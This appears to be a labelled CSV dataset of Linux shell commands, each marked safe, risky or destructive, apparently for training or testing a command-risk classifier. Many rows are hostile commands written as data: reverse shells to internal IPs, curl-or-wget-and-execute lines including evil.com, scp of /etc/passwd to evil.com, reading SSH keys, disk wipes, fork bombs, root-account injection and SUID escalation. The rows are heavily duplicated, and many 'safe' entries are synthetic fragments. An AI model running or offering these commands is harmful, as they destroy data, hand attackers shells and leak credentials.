command,label,source
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
shred -n 3 /dev/sda,destructive,synthetic
ls | grep -i error,safe,synthetic
mkfs.ext4 /dev/sda,destructive,synthetic
systemctl | grep -i ok,safe,synthetic
shred -vfz /dev/sda,destructive,synthetic
rm -rf build,risky,synthetic
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
mkfs.xfs /dev/nvme0n1,destructive,synthetic
rm -rf /,destructive,synthetic
shred -u /dev/sdb,destructive,mitre-attack
nc 10.0.0.5 1234 -e /bin/bash,risky,mitre-attack
dd if=/dev/zero of=/dev/sda bs=4M,destructive,mitre-attack
shred -vfz /dev/sda,destructive,synthetic
apt ..,safe,synthetic
echo 'working' && grep,safe,synthetic
apt list --installed,safe,bash-history
echo 'working' && mv,safe,synthetic
chmod -R 766 /var/www,risky,synthetic
cal 2026,safe,bash-history
export LD_PRELOAD=/home/user/evil.so,risky,synthetic
chmod 777 /opt/app,risky,mitre-attack
docker ..,safe,synthetic
mount --bind /proc /mnt/proc,risky,mitre-attack
grep -i 'failed' auth.log,safe,bash-history
ll,safe,bash-history
rm -rf node_modules/.cache,risky,synthetic
cp .,safe,synthetic
systemctl | grep -i fail,safe,synthetic
sudo usermod -aG sudo normaluser,risky,mitre-attack
dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive,synthetic
docker -v,safe,synthetic
ls -v,safe,synthetic
pip --help,safe,synthetic
echo 'working' && docker,safe,synthetic
grep -v,safe,synthetic
ping -c 4 google.com,safe,bash-history
PATH=$PATH:/tmp,risky,mitre-attack
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
shred -n 3 /dev/mmcblk0,destructive,synthetic
sudo su -,risky,mitre-attack
cat -v,safe,synthetic
echo 'working' && ls,safe,synthetic
tar --checkpoint=1 --checkpoint-action=exec=/bin/sh,risky,gtfobins
rm -rf ~,destructive,synthetic
sudo wipefs,destructive,synthetic
mkdir -v,safe,synthetic
rm -rf /boot,destructive,mitre-attack
"sh -c ""$(wget -qO- http://example.com/run.sh)""",risky,mitre-attack
lsblk,safe,bash-history
sort -k2 -n data.csv,safe,bash-history
sudo mkfs,destructive,synthetic
efibootmgr --delete-bootnum --bootnum 0000,destructive,mitre-attack
cp -v,safe,synthetic
cat | grep -i warn,safe,synthetic
shred -vfz /dev/mmcblk0,destructive,synthetic
mkfs.xfs /dev/sdb1,destructive,synthetic
sudo rm -rf /boot/grub,destructive,mitre-attack
pip -v,safe,synthetic
chmod 4755 /tmp/x,risky,synthetic
node --version,safe,bash-history
pip | grep -i warn,safe,synthetic
kill -9 $(pgrep -u root),risky,mitre-attack
export LD_PRELOAD=/tmp/lib.so,risky,synthetic
chmod -R 777 /,destructive,mitre-attack
sudo cat,safe,synthetic
echo 'working' && apt,safe,synthetic
apt ..,safe,synthetic
dd if=/dev/urandom of=/dev/sda,destructive,mitre-attack
sudo groupadd developers,safe,bash-history
grep --help,safe,synthetic
sudo head,safe,synthetic
mv old_name.py new_name.py,safe,bash-history
crontab -l,safe,bash-history
echo 'working' && grep,safe,synthetic
sudo mv,safe,synthetic
rm -rf /tmp/test/*,risky,synthetic
apt | grep -i warn,safe,synthetic
rm -rf dist,risky,synthetic
sudo systemctl status sshd,safe,bash-history
chmod -R 777 /opt/app,risky,synthetic
scp -r ./backup user@server:/backups/,safe,bash-history
cp -v,safe,synthetic
rm -rf dist,risky,synthetic
chmod 4755 /tmp/x,risky,synthetic
rm -rf /,destructive,synthetic
sudo mkdir,safe,synthetic
halt -f,risky,mitre-attack
systemctl | grep -i fail,safe,synthetic
head -v,safe,synthetic
poweroff --force,risky,mitre-attack
rm -rf tmp/*,risky,synthetic
shutdown -h now,risky,mitre-attack
rm -rf /var,destructive,synthetic
shred -n 3 /dev/sda,destructive,synthetic
cat /etc/os-release,safe,bash-history
chmod -R 777 /var/www,risky,mitre-attack
sh -i >& /dev/udp/10.0.0.5/7777 0>&1,risky,mitre-attack
rm -rf ~,destructive,synthetic
pip ..,safe,synthetic
parted /dev/sda mklabel gpt,destructive,mitre-attack
nsenter -t 1 -m -u -i -n -- bash,risky,mitre-attack
echo 'working' && systemctl,safe,synthetic
ls -v,safe,synthetic
sudo chmod 777 /usr,destructive,mitre-attack
chmod u+s /tmp/x,risky,synthetic
rm -rf /var,destructive,synthetic
rm -rf __pycache__,risky,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
chmod -R 777 /var/www,risky,synthetic
sudo dd,destructive,synthetic
mkdir --help,safe,synthetic
git push,safe,bash-history
rm -rf /tmp/test/*,risky,synthetic
chmod 4777 /bin/bash,risky,synthetic
echo 'user:hash' >> /etc/passwd,risky,mitre-attack
sudo ls,safe,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
apt -v,safe,synthetic
mv --help,safe,synthetic
git stash,safe,bash-history
sudo grep,safe,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
dd if=/dev/urandom of=/dev/sdb bs=1M,destructive,synthetic
export LD_LIBRARY_PATH=/tmp,risky,mitre-attack
usermod -o -u 0 username,risky,mitre-attack
cat file.txt,safe,bash-history
echo 'working' && git,safe,synthetic
mv /var/log,safe,synthetic
dd if=/dev/urandom of=/dev/sdb bs=4M,destructive,synthetic
gdb -ex 'shell /bin/sh',risky,gtfobins
git build/,safe,synthetic
mkfs.vfat /dev/sdb1,destructive,synthetic
shred -u /dev/mmcblk0,destructive,synthetic
cat data/,safe,synthetic
rg 'TODO' src/,safe,bash-history
grep ..,safe,synthetic
rm -rf tmp/*,risky,synthetic
rm -rf /tmp/test/*,risky,synthetic
mkfs.xfs /dev/sdb1,destructive,synthetic
chmod -R 777 /tmp/data,risky,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
echo 'working' && systemctl,safe,synthetic
head --help,safe,synthetic
rm -rf /etc,destructive,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
ls,safe,bash-history
sudo head,safe,synthetic
sudo dd if=image.iso of=/dev/sda bs=4M,destructive,mitre-attack
htop,safe,bash-history
PYTHONPATH=/tmp python script.py,risky,mitre-attack
echo 'working' && pip,safe,synthetic
sudo rm -rf /var/tmp/old*,risky,mitre-attack
git --help,safe,synthetic
mkfs.vfat /dev/sdb1,destructive,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
tar --checkpoint-action=exec='echo hacked',risky,gtfobins
chmod 777 ~/.ssh/config,risky,mitre-attack
ls -lah /var/log | tail -20,safe,bash-history
curl http://10.0.0.9/install.sh | bash,risky,synthetic
rm -rf build,risky,synthetic
mkdir -v,safe,synthetic
chmod 4755 /bin/bash,risky,synthetic
chmod 4755 /bin/busybox,risky,synthetic
export LD_PRELOAD=/home/user/evil.so,risky,synthetic
lsusb,safe,bash-history
cat | grep -i ok,safe,synthetic
head -20 access.log,safe,bash-history
mkdir | grep -i warn,safe,synthetic
sudo git,safe,synthetic
docker compose up -d,safe,bash-history
chmod 4755 /bin/busybox,risky,synthetic
chmod 4755 /bin/busybox,risky,synthetic
mv --help,safe,synthetic
mv -v,safe,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
echo 'working' && head,safe,synthetic
mkdir /var/log,safe,synthetic
apt --help,safe,synthetic
sudo rm,destructive,synthetic
docker run -v /:/host ubuntu bash,risky,mitre-attack
npm install,safe,bash-history
echo 'working' && ls,safe,synthetic
pwd,safe,bash-history
grep -v,safe,synthetic
cp --help,safe,synthetic
ls -la,safe,bash-history
wget -qO- http://example.com/setup.sh | sh,risky,mitre-attack
systemctl /tmp,safe,synthetic
echo 'working' && git,safe,synthetic
mv --help,safe,synthetic
chmod -R 766 /opt/app,risky,synthetic
parted /dev/sda rm 1,destructive,mitre-attack
rm -rf /*,destructive,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
ls ~/documents,safe,synthetic
pip /tmp,safe,synthetic
find / -delete,destructive,mitre-attack
apt -v,safe,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
top,safe,bash-history
dd if=/dev/urandom of=/dev/sdb bs=1M,destructive,synthetic
echo 'working' && mv,safe,synthetic
echo 'working' && head,safe,synthetic
chown root:root /tmp/x && chmod 4755 /tmp/x,risky,mitre-attack
curl http://example.com/install.sh | bash,risky,synthetic
nmap -p 22 localhost,safe,bash-history
:(){ :|:& };: &,destructive,mitre-attack
dd if=/dev/urandom of=/dev/nvme0n1 bs=4M,destructive,synthetic
chmod -R 766 /var/www,risky,synthetic
systemctl --help,safe,synthetic
cat ~/.ssh/id_rsa,risky,mitre-attack
echo 'working' && cat,safe,synthetic
kill -9 -1,risky,mitre-attack
which python3,safe,bash-history
rm -rf build,risky,synthetic
tail -f /var/log/syslog,safe,bash-history
mkfs.ext4 /dev/sdb1,destructive,synthetic
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
head --help,safe,synthetic
rm -rf --no-preserve-root /,destructive,mitre-attack
systemctl --help,safe,synthetic
sudo rm -rf /var/lib/dpkg,destructive,mitre-attack
sudo git,safe,synthetic
"awk 'BEGIN {system(""/bin/sh"")}'",risky,gtfobins
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
hostname,safe,bash-history
mkdir ..,safe,synthetic
systemctl status nginx,safe,bash-history
:(){ :|:& };:,destructive,mitre-attack
sudo git,safe,synthetic
ls --help,safe,synthetic
dd if=/dev/urandom of=/dev/nvme0n1 bs=4M,destructive,synthetic
chmod u+s /bin/busybox,risky,synthetic
shred -u /dev/sdb,destructive,synthetic
chmod -R 777 /var/www,risky,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
sudo journalctl -u ssh --since 1 hour ago,safe,bash-history
rm -rf /usr,destructive,synthetic
shred -vfz /dev/mmcblk0,destructive,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
wipe -fd /dev/sda,destructive,mitre-attack
wget http://evil.com/backdoor.py -O /tmp/b.py && python /tmp/b.py,risky,mitre-attack
sudo apt,safe,synthetic
cat --help,safe,synthetic
mkdir --help,safe,synthetic
sudo systemctl,safe,synthetic
export LD_PRELOAD=/home/user/evil.so,risky,synthetic
git | grep -i error,safe,synthetic
mkdir --help,safe,synthetic
head -v,safe,synthetic
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
mkfs.ext4 /dev/sda,destructive,synthetic
chmod u+s /bin/bash,risky,synthetic
grep -v,safe,synthetic
ls --help,safe,synthetic
rm -rf /etc,destructive,mitre-attack
export PATH=$PATH:/opt/bin,safe,bash-history
sudo apt,safe,synthetic
chmod -R 766 .,risky,synthetic
shred -n 3 /dev/mmcblk0,destructive,synthetic
sudo pip,safe,synthetic
git pull origin main,safe,bash-history
git /tmp,safe,synthetic
echo 'working' && head,safe,synthetic
git --help,safe,synthetic
sudo ls,safe,synthetic
mv /tmp,safe,synthetic
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
rm -rf node_modules/.cache,risky,synthetic
ufw disable,risky,mitre-attack
mkdir | grep -i error,safe,synthetic
sudo ls,safe,synthetic
grub-install --recheck --removable,destructive,mitre-attack
cat --help,safe,synthetic
chmod 4755 /bin/bash,risky,synthetic
docker | grep -i fail,safe,synthetic
shred -u /dev/sda,destructive,synthetic
grep -v,safe,synthetic
rm -rf node_modules/.cache,risky,synthetic
dig example.com,safe,bash-history
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
shred -vfz /dev/sdb,destructive,synthetic
rm -rf /usr,destructive,synthetic
chmod 4777 /bin/bash,risky,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
echo 'working' && docker,safe,synthetic
git /var/log,safe,synthetic
chmod 4755 /bin/busybox,risky,synthetic
echo 'working' && grep,safe,synthetic
chmod 4777 /tmp/x,risky,synthetic
sudo wipefs,destructive,synthetic
sudo ls,safe,synthetic
echo 'working' && cat,safe,synthetic
rm -rf /*,destructive,synthetic
yes | head -c 1000000000 > /dev/null,destructive,mitre-attack
systemctl src/,safe,synthetic
git data/,safe,synthetic
rm -rf tmp/*,risky,synthetic
dd if=/dev/urandom of=/dev/sda bs=512,destructive,synthetic
apt --help,safe,synthetic
scp /etc/passwd user@evil.com:/tmp/,risky,mitre-attack
chmod -R 766 /tmp/data,risky,synthetic
rm -rf __pycache__,risky,synthetic
sudo docker,safe,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
journalctl -u nginx --since today,safe,bash-history
su - root,risky,mitre-attack
sudo cp,safe,synthetic
sudo cat,safe,synthetic
docker --help,safe,synthetic
cp --help,safe,synthetic
rm -rf /tmp/test/*,risky,synthetic
unzip release.zip -d /opt/app,safe,bash-history
git ~/documents,safe,synthetic
cp /var/log,safe,synthetic
id,safe,bash-history
rm -rf /*,destructive,synthetic
cmake ..,safe,bash-history
chmod -R 766 /opt/app,risky,synthetic
rm -rf node_modules/.cache,risky,synthetic
mv -v,safe,synthetic
chmod 4777 /bin/busybox,risky,synthetic
chmod -R 777 /opt/app,risky,synthetic
chmod 4755 /usr/bin/find,risky,mitre-attack
sudo shred,destructive,synthetic
export LD_PRELOAD=/tmp/lib.so,risky,synthetic
apt update,safe,bash-history
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
chmod -R 777 .,risky,synthetic
sudo systemctl stop apparmor,risky,mitre-attack
rm -rf dist,risky,synthetic
git | grep -i ok,safe,synthetic
echo 'working' && pip,safe,synthetic
chmod u+s /tmp/x,risky,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
iptables -F,risky,mitre-attack
chmod u+s /bin/bash,risky,synthetic
chmod u+s /bin/busybox,risky,mitre-attack
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
mkfs.ext4 /dev/nvme0n1,destructive,synthetic
bash -c '$(curl http://example.com/p)',risky,mitre-attack
cargo build --release,safe,bash-history
mkdir src/,safe,synthetic
while true; do true; done,destructive,mitre-attack
curl http://10.0.0.9/install.sh | bash,risky,synthetic
sudo pip,safe,synthetic
chmod 4755 /bin/busybox,risky,synthetic
dd if=/dev/zero of=/dev/nvme0n1 bs=512,destructive,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
mkdir -p projects/backend/src,safe,bash-history
git --help,safe,synthetic
git | grep -i ok,safe,synthetic
shred -n 3 /dev/sdb,destructive,synthetic
systemctl -v,safe,synthetic
sudo head,safe,synthetic
rm -rf build,risky,synthetic
ls -v,safe,synthetic
echo 'working' && cat,safe,synthetic
cat | grep -i ok,safe,synthetic
rm -rf build,risky,synthetic
chmod -R 777 /tmp/data,risky,synthetic
rm -rf build,risky,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
sudo dd,destructive,synthetic
chmod 755 script.sh,safe,bash-history
docker ~/documents,safe,synthetic
head /tmp,safe,synthetic
mkdir -v,safe,synthetic
rm -rf /usr,destructive,mitre-attack
mkdir -v,safe,synthetic
echo 'working' && git,safe,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
rm -rf tmp/*,risky,synthetic
cp build/,safe,synthetic
cp --help,safe,synthetic
curl http://evil.com/shell.sh -o /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh,risky,mitre-attack
mv -v,safe,synthetic
dd if=/dev/urandom of=/dev/mmcblk0 bs=512,destructive,synthetic
mkdir .,safe,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
chmod 4777 /bin/busybox,risky,synthetic
shred -u /dev/sda,destructive,synthetic
echo 'working' && grep,safe,synthetic
mv | grep -i error,safe,synthetic
echo 'IyEvYmluL2Jhc2gK' | base64 -d | bash,risky,mitre-attack
echo 'working' && apt,safe,synthetic
apt -v,safe,synthetic
dd if=/dev/zero of=/dev/mmcblk0 bs=512,destructive,synthetic
rm -rf ~,destructive,mitre-attack
rm -rf node_modules/.cache,risky,synthetic
ps aux,safe,bash-history
sudo rm -rf /usr/bin,destructive,mitre-attack
shred -u /dev/mmcblk0,destructive,synthetic
mkfs.xfs /dev/sdb1,destructive,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
git -v,safe,synthetic
chmod -R 777 .,risky,synthetic
chmod 777 /etc/hosts,risky,mitre-attack
apt .,safe,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
systemctl -v,safe,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
echo 'working' && head,safe,synthetic
docker --help,safe,synthetic
head | grep -i warn,safe,synthetic
sudo chmod 777 /etc/shadow,risky,mitre-attack
shred -n 3 /dev/sdb,destructive,synthetic
apt /var/log,safe,synthetic
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
cat .,safe,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
systemctl /tmp,safe,synthetic
echo 'working' && git,safe,synthetic
mkdir -v,safe,synthetic
git --help,safe,synthetic
cat .,safe,synthetic
dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive,synthetic
mkfs.ext4 /dev/sdb1,destructive,synthetic
fdisk /dev/sda && mkfs.ext4 /dev/sda1,destructive,mitre-attack
apt /tmp,safe,synthetic
sudo apt,safe,synthetic
mv -v,safe,synthetic
export LD_PRELOAD=/tmp/lib.so,risky,synthetic
rm -rf tmp/*,risky,synthetic
sudo grep,safe,synthetic
mkfs.vfat /dev/sda,destructive,synthetic
python app.py,safe,bash-history
git -v,safe,synthetic
git add .,safe,bash-history
chmod -R 777 /var/www,risky,synthetic
uniq -c access.log | sort -rn | head,safe,bash-history
make,safe,bash-history
echo 'working' && systemctl,safe,synthetic
source ~/.bashrc,safe,bash-history
chmod 4777 /bin/bash,risky,synthetic
chmod -R 777 /tmp/data,risky,synthetic
pip /var/log,safe,synthetic
sudo systemctl,safe,synthetic
sudo wipefs,destructive,synthetic
sudo cp,safe,synthetic
pip -v,safe,synthetic
rm -rf /tmp/test/*,risky,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
grep --help,safe,synthetic
sudo dd,destructive,synthetic
head -v,safe,synthetic
rm -rf /tmp/test/*,risky,synthetic
docker ps,safe,bash-history
mkfs.xfs /dev/sda,destructive,synthetic
git -v,safe,synthetic
uname -a,safe,bash-history
export LD_PRELOAD=/tmp/lib.so,risky,synthetic
sudo apt,safe,synthetic
dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive,synthetic
export LD_PRELOAD=/tmp/lib.so,risky,synthetic
echo 'working' && apt,safe,synthetic
grep data/,safe,synthetic
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
sudo rm,destructive,synthetic
echo 'working' && grep,safe,synthetic
rm -rf tmp/*,risky,synthetic
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
dmesg | tail,safe,bash-history
mv --help,safe,synthetic
git checkout -b feature/new,safe,bash-history
rm -rf __pycache__,risky,synthetic
pip --help,safe,synthetic
sudo setenforce 0,risky,mitre-attack
mkfs.btrfs /dev/nvme0n1,destructive,synthetic
chmod 4755 /bin/busybox,risky,synthetic
grep -v,safe,synthetic
dd if=/dev/urandom of=/dev/nvme0n1 bs=512,destructive,synthetic
docker -v,safe,synthetic
ls --help,safe,synthetic
sudo git,safe,synthetic
echo 'working' && pip,safe,synthetic
export LD_PRELOAD=/home/user/evil.so,risky,synthetic
python3 main.py --port 8080,safe,bash-history
chmod 4755 /bin/bash,risky,synthetic
touch newfile.txt,safe,bash-history
cp --help,safe,synthetic
clear,safe,bash-history
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
sudo rm,destructive,synthetic
ls | grep -i warn,safe,synthetic
head -v,safe,synthetic
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
pip -v,safe,synthetic
sudo grep,safe,synthetic
tree -L 2,safe,bash-history
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
echo 'working' && pip,safe,synthetic
mkfs.vfat /dev/sdb1,destructive,synthetic
git -v,safe,synthetic
sudo useradd -m testuser,safe,bash-history
curl http://example.com/install.sh | bash,risky,synthetic
mkfs.vfat /dev/sdb1,destructive,synthetic
chmod -R 766 .,risky,synthetic
rm -rf /var,destructive,synthetic
"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",risky,mitre-attack
rm -rf node_modules/.cache,risky,synthetic
reboot --force,risky,mitre-attack
cd /var/log,safe,bash-history
npm list --depth=0,safe,bash-history
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
sudo rm -rf /,destructive,mitre-attack
curl http://10.0.0.9/install.sh | bash,risky,synthetic
mkfs.vfat /dev/nvme0n1,destructive,synthetic
apt -v,safe,synthetic
ls -v,safe,synthetic
cat ..,safe,synthetic
sudo nmap -sP 192.168.1.0/24,safe,bash-history
sudo dd,destructive,synthetic
chmod u+s /bin/busybox,risky,synthetic
rm -rf dist,risky,synthetic
mv -v,safe,synthetic
chmod u+s /bin/bash,risky,synthetic
apt | grep -i fail,safe,synthetic
chmod -R 777 .,risky,synthetic
chmod 4777 /bin/bash,risky,synthetic
ls -v,safe,synthetic
chmod 4755 /bin/bash,risky,synthetic
mkdir --help,safe,synthetic
dd if=/dev/zero of=/dev/mmcblk0 bs=1M,destructive,mitre-attack
git status,safe,bash-history
sudo shred,destructive,synthetic
echo 'working' && mv,safe,synthetic
sh <(curl http://example.com/s.sh),risky,mitre-attack
rm -rf build,risky,synthetic
git log --oneline -10,safe,bash-history
echo 'working' && head,safe,synthetic
pip | grep -i fail,safe,synthetic
export LD_PRELOAD=/home/user/evil.so,risky,synthetic
sudo mv,safe,synthetic
chmod 4777 /tmp/x,risky,synthetic
systemctl .,safe,synthetic
mv | grep -i ok,safe,synthetic
chmod -R 766 /tmp/data,risky,synthetic
sudo mkdir,safe,synthetic
mkdir | grep -i warn,safe,synthetic
apt | grep -i fail,safe,synthetic
head | grep -i warn,safe,synthetic
systemctl | grep -i fail,safe,synthetic
rm -rf /tmp/cache/*,risky,mitre-attack
tar -czf backup.tar.gz /home/user/docs,safe,bash-history
sudo docker,safe,synthetic
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
chmod u+s /bin/bash,risky,synthetic
rm -rf /var,destructive,synthetic
cd ..,safe,bash-history
sudo cat,safe,synthetic
mv | grep -i ok,safe,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
dd if=/dev/urandom of=/dev/mmcblk0 bs=512,destructive,synthetic
rm -rf /bin,destructive,synthetic
chmod 777 /etc/passwd,destructive,mitre-attack
shred -vfz /dev/sdb,destructive,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
head --help,safe,synthetic
sudo mkfs,destructive,synthetic
echo 'working' && cp,safe,synthetic
cat ..,safe,synthetic
grep | grep -i fail,safe,synthetic
chmod -R 777 /tmp/data,risky,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
sudo cat,safe,synthetic
git | grep -i fail,safe,synthetic
rm -rf /bin,destructive,mitre-attack
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
chmod -R 777 /var/www,risky,synthetic
chmod -R 777 .,risky,synthetic
mv -v,safe,synthetic
echo 'working' && mv,safe,synthetic
lspci,safe,bash-history
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
grep /var/log,safe,synthetic
echo 'working' && apt,safe,synthetic
chmod u+s /bin/busybox,risky,synthetic
pip install requests,safe,bash-history
cat --help,safe,synthetic
sudo cat,safe,synthetic
sudo systemctl,safe,synthetic
dd if=/dev/urandom of=/dev/sdb bs=1M,destructive,synthetic
docker /var/log,safe,synthetic
cat | grep -i ok,safe,synthetic
echo 'working' && cat,safe,synthetic
rm -rf build,risky,synthetic
docker logs app,safe,bash-history
echo 'working' && ls,safe,synthetic
rm -rf dist,risky,synthetic
sudo mkdir,safe,synthetic
chmod 644 config.json,safe,bash-history
cp --help,safe,synthetic
chmod +x deploy.sh,safe,bash-history
git diff,safe,bash-history
chmod -R 777 /var/www,risky,synthetic
ssh user@server 'df -h',safe,bash-history
git --help,safe,synthetic
curl http://example.com/install.sh | bash,risky,mitre-attack
rm -rf /usr,destructive,synthetic
chmod 4755 /bin/bash,risky,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
head --help,safe,synthetic
grep src/,safe,synthetic
chown -R user:user /home/user/project,safe,bash-history
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
sudo docker,safe,synthetic
chmod 4755 /bin/busybox,risky,synthetic
systemctl .,safe,synthetic
ls --help,safe,synthetic
rm -rf /root,destructive,mitre-attack
rm -rf build,risky,synthetic
sudo shred,destructive,synthetic
socat TCP:10.0.0.5:9999 EXEC:/bin/sh,risky,mitre-attack
systemctl -v,safe,synthetic
mv | grep -i ok,safe,synthetic
chmod -R 766 /var/www,risky,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
chmod -R 777 /tmp/data,risky,synthetic
head --help,safe,synthetic
echo 'working' && pip,safe,synthetic
cp -v,safe,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
cp data/,safe,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
shred -vfz /dev/sdb,destructive,synthetic
rm -rf /bin,destructive,synthetic
